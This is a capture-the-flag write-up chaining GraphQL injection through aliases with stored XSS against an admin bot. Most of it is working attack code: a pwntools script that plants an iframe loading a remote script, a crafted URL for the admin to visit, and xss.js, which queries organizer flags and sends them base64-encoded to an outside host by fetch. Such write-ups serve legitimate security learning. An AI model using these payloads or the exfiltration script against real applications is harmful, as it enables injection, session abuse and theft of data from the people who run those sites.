When creating a task in a ctf the description is rendered as HTML but there is
some sanitization.  
The name is rendered as a string but without sanitization.

The function `ctf` in `query.js` is vulnerable to graphql injection.

```javascript=  
async function ctf(id) {  
   return await query(`{  
       wtf(id: ${id}) { # Injection in id here  
           name  
           description  
           challs {  
               name  
               points  
               description  
           }  
       }  
   }`)  
}  
```

We can modify the graphql query an abuse aliases to get name instead of
description

Exploit:  
* Create a WTF (id=2)  
* Create chall with the xss in the name  
* make the admin visit `/?#wtf/2){id,challs{description:name}}a:wtf(id:2`  
* profit

poc.py

```python  
#!/usr/bin/env python  
# type: ignore  
from pwn import *  
import time  
from request import Session  
import re  
import json  
from subprocess import check_output

def jprint(j):  
 print(json.dumps(j, indent=2))

prefix_reg = re.compile("sha1\(([a-f0-9]+)")  
url_reg = re.compile(".* listening on (.*)")

sh = remote("hyper.tasteless.eu", 10301)  
s = Session()

def connect():  
 l = sh.readline().decode()  
 h = prefix_reg.findall(l)[0]  
 cmd = f"go run pow.go {h} 000000"  
 print(cmd)  
 p = check_output(cmd, shell=True).strip()  
 sh.sendline(p)  
 print(sh.readline())  
 l = sh.readline().decode()  
 url = url_reg.findall(l)[0]  
 print(url)  
 return url

url = connect()

def send_query(query):  
 data = {  
   "query": query,  
   "variables": {}  
 }  
  
 r = s.post(url + "graphql", json=data).json()  
 jprint(r)

time.sleep(1)

send_query("""  
mutation register{  
 register(username:"bitk", password:"bitk")  
}

""")  
send_query("""  
mutation authenticate{  
 authenticate(username:"bitk", password:"bitk")  
}

""")

send_query("""  
mutation createWTF{  
 createWTF(input: {name:"xss", description:"xss"}){id}  
}

""")

send_query("""  
mutation createChall{  
 createChall(input: {wtf:2, name:"<iframe srcdoc=\\"<script
src='https://bi.tk/zob/xss.js'></script>\\"></iframe>",
description:"xss"}){id}  
}

""")  
sh.interactive()

```

make the admin visit  `/?#wtf/2){id,challs{description:name}}a:wtf(id:2` to
trigger the javascript

Xss.js  
```javascript  
async function main(){  
   const r = await parent.query(`{  
organizers{  
 wtfs{  
   challs{  
     name  
     flag  
   }  
 }  
}  
}  
`, {})  
   const msg = btoa(JSON.stringify(r.data))  
   await fetch("https://bi.tk/?"+msg, { mode:'no-cors'})  
}

main()

```